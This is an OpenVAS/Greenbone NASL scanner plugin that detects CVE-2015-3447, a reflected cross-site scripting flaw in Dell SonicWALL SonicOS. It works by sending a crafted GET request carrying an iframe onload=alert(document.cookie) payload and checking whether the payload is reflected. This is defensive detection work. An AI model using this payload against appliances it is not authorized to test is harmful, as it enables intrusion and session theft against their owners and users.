if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805067" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2015-3447" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-04-29 12:50:10 +0530 (Wed, 29 Apr 2015)" );
	script_name( "Dell SonicWALL SonicOS 'macIpSpoofView.html' Cross Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is running Dell SonicWALL
  SonicOS and is prone to cross site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "This flaw exists because the
  /macIpSpoofView.html script does not validate input to the 'searchSpoof'
  and 'searchSpoofIpDet' GET parameters before returning it to users." );
	script_tag( name: "impact", value: "Successful exploitation will allow
  remote attackers to create a specially crafted request that would execute
  arbitrary script code in a user's browser session within the trust relationship
  between their browser and the server." );
	script_tag( name: "affected", value: "Dell SonicWall SonicOS 7.5.0.12 and 6.x" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "exploit" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/535393" );
	script_xref( name: "URL", value: "http://www.vulnerability-lab.com/get_content.php?id=1359" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "SonicWALL/banner" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
http_port = http_get_port( default: 80 );
Banner = http_get_remote_headers( port: http_port );
if(!Banner || !ContainsString( Banner, "Server: SonicWALL" )){
	exit( 0 );
}
url = "/macIpSpoofView.html?mainFrameYAxis=0&startItem=0&startItemIpDet=0" + "&currIfaceConfig=0&currIfaceConfigIndex=1&searchSpoof=[x]&searchSp" + "oofIpDet=%22%3E%3Ciframe%20src%3Da%20onload%3Dalert(document.cookie)";
useragent = http_get_user_agent();
host = http_host_name( port: http_port );
sndReq = NASLString( "GET ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\\r\\n" );
rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "><iframe src=a onload=alert(document.cookie)" ) && ContainsString( rcvRes, "MAC-IP Anti-Spoof" ) && ContainsString( rcvRes, "Spoof Detection" )){
	report = http_report_vuln_url( port: http_port, url: url );
	security_message( port: http_port, data: report );
	exit( 0 );
}
exit( 99 );

